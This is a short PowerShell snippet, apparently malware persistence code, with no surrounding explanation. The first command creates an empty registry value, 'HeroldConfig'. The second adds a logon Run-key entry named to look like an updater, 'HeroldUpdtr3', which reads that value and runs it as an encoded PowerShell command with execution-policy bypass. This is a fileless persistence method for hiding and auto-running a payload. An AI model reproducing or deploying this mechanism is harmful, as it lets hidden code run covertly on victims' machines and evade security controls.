New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\" -Name HeroldConfig -Value "" -PropertyType String -Force 


New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name HeroldUpdtr3 -Value '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=((gp HKCU:Software\Microsoft\Windows\CurrentVersion HeroldConfig).HeroldConfig); powershell -NoLogo -NonInteractive -ep bypass -EncodedCommand $x"' -PropertyType String -Force
